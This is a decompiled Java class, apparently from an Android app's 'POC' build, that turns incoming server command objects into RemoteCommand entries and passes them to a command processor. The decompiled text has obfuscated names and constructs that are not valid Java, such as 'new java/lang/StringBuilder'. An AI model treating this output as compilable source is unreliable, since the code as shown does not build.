package com.vvt.appengine;

import com.vvt.phoenix.prot.command.a.q;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.RemoteCommand.Type;
import java.util.Iterator;
import java.util.List;

public class t
  implements com.vvt.datadeliverymanager.a.b
{
  private static final boolean a = a.a;
  private static final boolean b = a.c;
  private AppEngine1 c;
  
  public t(AppEngine1 paramh)
  {
    this.c = paramh;
  }
  
  public void a(List paramList)
  {
    boolean bool = a;
    if (bool) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      Object localObject1 = (q)localIterator.next();
      int i = b;
      if (i != 0) {}
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      Object localObject2 = localStringBuilder.append("<");
      int k = ((q)localObject1).a();
      localObject2 = ((StringBuilder)localObject2).append(k);
      Object localObject3 = ">";
      ((StringBuilder)localObject2).append((String)localObject3);
      i = 0;
      localObject2 = null;
      for (;;)
      {
        k = ((q)localObject1).b();
        if (i >= k) {
          break;
        }
        localObject3 = localStringBuilder.append("<");
        String str = ((q)localObject1).a(i);
        localObject3 = ((StringBuilder)localObject3).append(str);
        str = ">";
        ((StringBuilder)localObject3).append(str);
        int j;
        i += 1;
      }
      localObject1 = new com/vvt/remotecommand/RemoteCommand;
      ((RemoteCommand)localObject1).<init>();
      localObject2 = RemoteCommand.Type.PCC;
      ((RemoteCommand)localObject1).setType((RemoteCommand.Type)localObject2);
      localObject2 = localStringBuilder.toString();
      ((RemoteCommand)localObject1).setData((String)localObject2);
      localObject2 = this.c.p;
      ((com.vvt.remotecommand.b)localObject2).a((RemoteCommand)localObject1);
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/t.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */